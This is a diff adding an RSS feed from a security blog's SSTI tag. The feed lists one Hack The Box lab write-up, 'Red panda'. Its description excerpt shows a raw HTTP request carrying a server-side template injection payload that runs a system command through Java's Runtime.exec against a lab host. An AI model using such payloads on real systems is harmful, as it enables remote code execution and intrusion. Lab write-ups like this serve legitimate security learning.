@@ -1,0 +1,66 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+ xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+ xmlns:dc="http://purl.org/dc/elements/1.1/" 
+ xmlns:atom="http://www.w3.org/2005/Atom" 
+ xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+ xmlns:media="http://search.yahoo.com/mrss/">
+ <channel>
+  <title>SSTI on ch1nhpd</title>
+  <link>https://ch1nhpd.github.io/tags/ssti/</link>
+  <description>Recent content in SSTI on ch1nhpd</description>
+  <generator>Hugo -- gohugo.io</generator>
+  <language>vi</language>
+  <managingEditor>pdc1761.n@gmail.com (Phạm Đăng Chính)</managingEditor>
+  <webMaster>pdc1761.n@gmail.com (Phạm Đăng Chính)</webMaster>
+  <copyright>©2022, All Rights Reserved</copyright>
+  <lastBuildDate>Fri, 17 Jun 2022 15:10:06 +0700</lastBuildDate>
+  
+    <atom:link href="https://ch1nhpd.github.io/tags/ssti/index.xml" rel="self" type="application/rss+xml" />
+  
+
+   
+   <item>
+    <title>Red panda - HTB</title>
+    <link>https://ch1nhpd.github.io/posts/red-panda-htb/</link>
+    <pubDate>Fri, 17 Jun 2022 15:10:06 +0700</pubDate>
+    <author>pdc1761.n@gmail.com (Phạm Đăng Chính)</author>
+    <atom:modified>Fri, 17 Jun 2022 15:10:06 +0700</atom:modified>
+    <guid>https://ch1nhpd.github.io/posts/red-panda-htb/</guid>
+    <description>chuỗi --      POST /search HTTP/1.1Host: 10.10.11.170:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 112Origin: http://10.10.11.170:8080Connection: closeReferer: http://10.10.11.170:8080/Upgrade-Insecure-Requests: 1name=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#39;id&#39;).getInputStream())} </description>
+    
+    <dc:creator>ch1nhpd</dc:creator>
+    <media:content url="https://ch1nhpd.github.io/images/tmp.jpg" medium="image"><media:title type="html">featured image</media:title></media:content>
+    
+    
+    
+     
+      
+       <category>HTB</category>
+      
+     
+      
+       <category>WEB</category>
+      
+     
+      
+       <category>SSTI</category>
+      
+     
+    
+    
+     
+      
+     
+      
+     
+      
+     
+    
+    
+   </item>
+   
+
+  
+ </channel>
+</rss>
